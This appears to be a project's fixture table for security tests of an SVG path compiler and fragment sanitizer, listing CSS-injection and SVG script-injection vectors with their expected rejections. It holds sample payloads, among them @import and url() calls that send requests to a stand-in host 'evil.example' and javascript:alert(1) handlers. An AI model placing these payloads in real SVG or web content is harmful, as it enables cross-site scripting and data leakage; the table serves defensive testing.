# SVG Attack Fixtures

One entry per attack vector mapped to the article's class. Each fixture is a `.pathogen` source (or fragment string) that *would* trigger the vulnerability if the compiler/sanitizer did not handle it. The corresponding `tests/security/*.test.ts` asserts the expected behavior.

| # | Class | Fixture | Expected after fix |
|---|------|------|------|
| C1 | CSS injection via @property name | `let v = CSSVar("--x}; @import url(https://evil.example/log); /*", "red"); define PathLayer('a') ${ stroke: v; } layer('a').apply { M 0 0 L 10 10 }` | Evaluator error: identifier validation rejects the malformed name. |
| C2 | CSS injection via @property initial-value | `let v = CSSVar("--brand", "} @import url(https://evil.example/log) {"); define PathLayer('a') ${ stroke: v; } layer('a').apply { M 0 0 L 10 10 }` | Evaluator error: `validateCSSValue` rejects the unbraced injection. |
| C3 | url() with remote URL in style block | `define PathLayer('a') ${ background-image: "url(https://evil.example/log)"; } layer('a').apply { M 0 0 L 10 10 }` | Evaluator error: `validateCSSValue` rejects `url(`. |
| C4 | url() with CSS escape codes | `define PathLayer('a') ${ fill: "\\75\\72\\6c(https://evil.example/log)"; } layer('a').apply { M 0 0 L 10 10 }` | Evaluator error: rejects backslash escape sequences. |
| C5 | image-set() | `define PathLayer('a') ${ background-image: "image-set('https://evil.example/log' 1x)"; } layer('a').apply { M 0 0 L 10 10 }` | Evaluator error: rejects `image-set(`. |
| C6 | var() in style block (no CSSVar wrapper) | `define PathLayer('a') ${ fill: "var(--evil)"; } layer('a').apply { M 0 0 L 10 10 }` | Evaluator error: rejects raw `var(` — direct it to use `CSSVar()`. |
| C7 | calc() in style block | `define PathLayer('a') ${ stroke-width: "calc(2 + 3)"; } layer('a').apply { M 0 0 L 10 10 }` | Evaluator error: rejects `calc(` — Pathogen has its own `calc()` keyword for path args. |
| C8 | Layer name with CSS-breakout | `layer { name: "a}; @import url(https://evil.example/log); /*"; M 0 0 L 10 10 }` | Evaluator error: identifier rejection. |
| C9 | Mask() id with breakout | `Mask("a}.b{") { M 0 0 L 10 10 }` | Evaluator error: identifier rejection. |
| C10 | Gradient id with breakout | `LinearGradient("a\"x", { x1: 0, y1: 0, x2: 1, y2: 0, stops: [[0, "#000"], [1, "#fff"]] })` | Evaluator error: identifier rejection. |
| F1 | `<foreignObject>` with onclick HTML | `SVGDocumentFragment("<foreignObject><div xmlns='http://www.w3.org/1999/xhtml' onclick='alert(1)'></div></foreignObject>")` | Sanitizer error: `<foreignObject>` blocked. |
| F2 | `<a xlink:href="javascript:">` | `SVGDocumentFragment("<a xlink:href='javascript:alert(1)'><circle r='10'/></a>")` | Sanitizer error: `<a>` blocked. |
| F3 | `<animate attributeName="href" to="javascript:">` | `SVGDocumentFragment("<image href='#x'><animate attributeName='href' to='javascript:alert(1)'/></image>")` | Sanitizer error: `<animate>` blocked. |
| F4 | `<image href="https://...">` | `SVGDocumentFragment("<image href='https://evil.example/log'/>")` | Sanitizer error: href protocol rejected. |
| F5 | Inline `style="..."` | `SVGDocumentFragment("<rect style='background:url(https://evil.example/log)'/>")` | Sanitizer error: inline style attribute rejected. |
| F6 | `<style>` block | `SVGDocumentFragment("<style>* { background: url(https://evil.example/log); }</style>")` | Sanitizer error: `<style>` blocked. |
| F7 | `<use href="javascript:">` | `SVGDocumentFragment("<use href='javascript:alert(1)'/>")` | Sanitizer error: href protocol rejected. |
| P1 | Long transition restyling | Through C1: malicious CSS with `transform: ... transition: all 9999s` — depends on C1 being closed. | Indirect: prevented because C1 cannot inject CSS. |

## Notes on coverage

- **C1–C7** test the compiler emission path (Phase 1).
- **C8–C10** test identifier validation across def-id and layer-name surfaces (Phase 1).
- **F1–F7** test the fragment sanitizer (Phase 2).
- **P1** is indirect: it depends on C1's CSS injection vector being closed.

When adding a new vector, add a row here and a corresponding test case in `tests/security/`.
